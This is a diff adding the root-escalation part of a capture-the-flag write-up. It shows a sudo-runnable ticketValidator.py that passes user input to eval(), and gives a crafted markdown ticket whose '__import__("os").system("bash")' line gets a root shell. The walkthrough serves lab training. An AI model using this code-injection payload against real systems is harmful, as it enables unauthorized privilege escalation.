@@ -86,3 +86,41 @@ as we can see from the result, we have now the connection info to user: developm
 ###### connect via SSH
 
 <code>cat user.txt</code> - Congrats this is the first flag.
+
+
+
+<br>
+
+## Time to own the system
+
+run: <code>sudo -l</code> to see what files the current user can run
+
+![sudo -l -> response](https://is-going-to-rick-roll.me/1637778122.png)
+
+The only intresting file is ticketValidator.py, this is also might me our hint.
+
+After a short look i can see that this file is evaluating user input, so it might be vulnerable.
+
+# Conclusions regarding the script
+
+* File must to end with <mark>.md</mark>
+* First line in the file must be <mark># Skytrain Inc</mark>
+* Second line in the file must to start with <mark>## Ticket to &nbsp;</mark>
+* Closed tickets 3rd line will be <mark>__Ticket Code:__</mark> you can also leave it like <mark>__Ticket Code:</mark>
+  but line after must to start with <bold>**</bold> and it'll be replaced with ""
+* After all these steps and if you pass all the checks It'll check if <code>if int(ticketCode) % 7 == 4:</code> is true
+and It'll eval <code>eval(x.replace("**", ""))</code>
+
+
+<h6>make sure to run this script with sudo</h6>
+```s
+# Skytrain Inc
+## Ticket to 
+__Ticket Code:__
+**11+__import__("os").system("bash")
+```
+
+run: <code>whoami</code> -> congrats you are root!
+
+<code>cd ~</code>
+<code>cat root.txt</code>
